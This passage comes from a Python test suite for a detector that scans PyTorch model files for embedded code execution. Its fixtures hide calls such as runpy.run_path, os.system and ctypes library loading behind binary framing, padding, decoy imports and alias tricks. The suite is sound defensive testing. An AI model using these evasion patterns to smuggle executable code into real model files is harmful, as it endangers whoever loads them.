            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_runpy_member_after_module_alias_rebind(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"class Safe:\n"
            b"    run_path = len\n"
            b"def payload():\n"
            b"    import runpy as rp\n"
            b"    rp = Safe()\n"
            b"    return rp.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_possible_runpy_execution_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n    if replace:\n        runpy.run_path = len\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_prefixed_aliased_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_top_level_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_window_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES + 16)
            + b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_snippet_after_harmless_imports(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"from runpy import run_path as run\nrun('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"import harmless as h, runpy as rp\nrp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_continued_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = (
            b"\x00\xff" + leading_imports + b"import harmless as h, \\\n    runpy as rp\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "continued_import",
        [
            b"from runpy\\\n import run_path as run\n",
            b"from runpy \\\n import run_path as run\n",
            b"from runpy\\\r\n import run_path as run\r\n",
            b"from runpy \\\r\n import run_path as run\r\n",
        ],
    )
    def test_scan_model_detects_late_priority_runpy_continued_from_import(self, continued_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + continued_import + b"run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_after_large_function_preamble(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"    # pad\n" * 600
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_after_prefix_overwrite_across_gap(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n" + filler + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_omitted_middle_may_restore_overwrite(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n"
            + filler
            + b"runpy.__dict__['run_path'] = runpy.run_module\n"
            + filler
            + b"def payload():\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_safe_middle_state_is_omitted(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            + filler
            + b"runpy.run_path = len\n"
            + filler
            + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xffimport runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_comment_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp  # (\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_string_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffimport runpy as rp; marker = "("\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_priority_import_in_function_context(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_alias_call_after_import_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_report_safe_late_priority_overwrite_from_compact_span(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy\n"
            + b"    runpy.run_path = len\n"
            + b"    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy as rp\n" + padding + b'    text = """\n'
            b"    rp.run_path('payload.py')\n"
            b'    """\n'
            b"    return 1\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_rebound_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path = runpy.run_module\n"
            b"rp.run_path('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_call_between_compact_priority_segments(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_before = b"# before\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# before\n") + 8
        )
        padding_after = b"# after\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# after\n") + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import os\n"
            + padding_before
            + b"runpy.run_path('payload.py')\n"
            + padding_after
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_alias_call_after_non_call_alias_use(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"rp.other = 1\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy\nrun = runpy.run_path\n" + padding + b"run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_shadowed_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + b"run = len\n"
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_block",
        [
            b"del c\n",
            b"(c := len)\n",
            b"for c in [len]:\n    pass\n",
            b"with contextlib.suppress(Exception) as c:\n    pass\n",
        ],
    )
    def test_scan_model_honors_late_ctypes_alias_shadowing_after_priority_window(self, shadow_block: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\nimport contextlib\n"
            + padding
            + shadow_block
            + padding
            + b"c.CDLL('libpayload.so')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_dead_branch_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"if False:\n    import runpy as rp\n"
            + padding
            + b"rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_priority_import_offsets_ignore_non_executable_import_text(self) -> None:
        source = (
            b'value = "import os"\n'
            b"value = '\xc3\xa9 import os'\n"
            b"# import runpy\n"
            b'text = """\nimport subprocess\n"""\n'
            b"if True:\n    import ctypes as c\n"
            b"value = 1; import webbrowser as browser\n"
            b"if True: from webbrowser import open as inline_open; inline_open('safe')\n"
            b"label: from webbrowser import open as invalid_open\n"
            b"value if flag else label: from webbrowser import open as ternary_open\n"
            b"value = 'if True: from webbrowser import open as quoted_open'\n"
            b"# if True: from webbrowser import open as commented_open\n"
            b"\x00\xffimport os as alias\n"
        )

        offsets = jit_script_module._priority_import_offsets(source)

        assert offsets == [
            source.index(b"import ctypes"),
            source.index(b"import webbrowser"),
            source.index(b"from webbrowser import open as inline_open"),
            source.index(b"import os as alias"),
        ]

    def test_scan_model_ignores_non_ascii_string_priority_decoys(self) -> None:
        detector = JITScriptDetector()
        import_decoys = b"value = '\xc3\xa9 import os'\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS + 2
        )
        source = b"\x00\xff" + import_decoys + b"import os as alias\nalias.system('payload')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_priority_import_decoys_before_late_dangerous_import(self) -> None:
        detector = JITScriptDetector()
        import_decoys = b"# import os\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS + 2)
        source = b"\x00\xff" + import_decoys + b"import os as alias\nalias.system('payload')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_late_semicolon_priority_import(self) -> None:
        detector = JITScriptDetector()
        leading_starts = b"".join(
            f"value_{index} = {index}\n".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2)
        )
        source = b"\x00\xff" + leading_starts + b"value = 1; import os as alias\nalias.system('payload')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "body",
        [
            b"opener('https://example.invalid')",
            b"alias = opener; alias('https://example.invalid')",
            b"(alias := opener)('https://example.invalid')",
        ],
    )
    @pytest.mark.parametrize(("condition", "should_detect"), [(b"True", True), (b"False", False)])
    def test_scan_model_keeps_late_one_line_compound_priority_import(
        self,
        condition: bytes,
        should_detect: bool,
        body: bytes,
    ) -> None:
        detector = JITScriptDetector()
        leading_starts = b"".join(
            f"value_{index} = {index}\n".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_starts
            + b"if "
            + condition
            + b": from webbrowser import open as opener; "
            + body
            + b"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert (
            any(
                finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
                for finding in findings
            )
            is should_detect
        )

    @pytest.mark.parametrize("clause", [b"else:", b"elif flag:", b"except Exception:", b"finally:"])
    def test_scan_model_keeps_priority_import_after_standalone_continuation_header(self, clause: bytes) -> None:
        detector = JITScriptDetector()
        leading_starts = b"".join(
            f"value_{index} = {index}\n".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_starts
            + clause
            + b" from webbrowser import open as opener; opener('https://example.invalid')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_probes_import_after_detached_continuation_header(self) -> None:
        source = (
            b"\x00\xffif True:\n"
            b"    pass\n"
            b"marker = 1\n"
            b"else: from webbrowser import open as opener; opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_probes_import_after_duplicate_else_header(self) -> None:
        source = (
            b"\x00\xffif True:\n"
            b"    pass\n"
            b"else:\n"
            b"    pass\n"
            b"else: from webbrowser import open as opener; opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(("condition", "should_detect"), [(b"True", False), (b"False", True)])
    def test_scan_model_preserves_context_for_same_line_continuation_import(
        self,
        condition: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"\x00\xffif "
            + condition
            + b":\n    pass\nelse: from webbrowser import open as opener; opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    def test_scan_model_detects_indented_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = (
            b"\x00\xff" + leading_blocks + b"if True:\n" + b"    import runpy\n" + b"    runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "compound_payload",
        [
            b"if flag:\n    pass\nelse:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nexcept Exception:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nfinally:\n    import runpy\n    runpy.run_path('payload.py')\n",
        ],
    )
    def test_scan_model_detects_clause_priority_import_after_default_cap(self, compound_payload: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + compound_payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_alias_comparisons_before_late_priority_attribute_load(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        comparisons = b"".join(b"c == None\n" for _index in range(_PRIORITY_USAGE_STRESS_LINES))
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + comparisons + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize("filler_line", [b"foo(c=1)\n", b"obj.c = 1\n"])
    def test_scan_model_ignores_nonbinding_alias_syntax_before_late_priority_attribute_load(
        self, filler_line: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        filler = filler_line * _PRIORITY_USAGE_STRESS_LINES
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + filler + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    def test_scan_model_bounds_shadow_only_priority_lines_before_late_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * _PRIORITY_USAGE_STRESS_LINES
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\n"
            + padding
            + shadows
            + b"import ctypes as c\n"
            + b"c.cdll.msvcrt\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_line",
        [
            b"run, other = len, 1\n",
            b"(run) = len\n",
            b"[run] = [len]\n",
            b"other, (run, final) = 1, (len, 2)\n",
            b"*run, other = [len], 1\n",
        ],
    )
    def test_scan_model_honors_destructured_alias_shadowing_before_late_priority_call(self, shadow_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_line
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_import",
        [
            b"import math as run\n",
            b"from math import sqrt as run\n",
        ],
    )
    def test_scan_model_honors_import_alias_shadowing_before_late_priority_call(self, shadow_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_import
            + padding
            + b"run(1)\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_shadow_only_priority_lines(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * 512
        shadow_candidate = shadows + b"import ctypes as c\nc.cdll.msvcrt\n"
        usage_lines, proved_rule_codes = jit_script_module._priority_alias_usage_lines(
            shadow_candidate,
            frozenset({b"c"}),
            0,
        )
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + shadow_candidate

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert usage_lines == []
        assert proved_rule_codes == frozenset()
        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "clause_source",
        [
            (b"def payload(flag):\n    if flag:\n        return None\n    else:\n        # pad\n"),
            (b"def payload():\n    try:\n        return None\n    except Exception:\n        # pad\n"),
            (b"def payload():\n    try:\n        value = 1\n    finally:\n        # pad\n"),
        ],
    )
    def test_scan_model_detects_deep_priority_import_inside_compound_clauses(self, clause_source: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
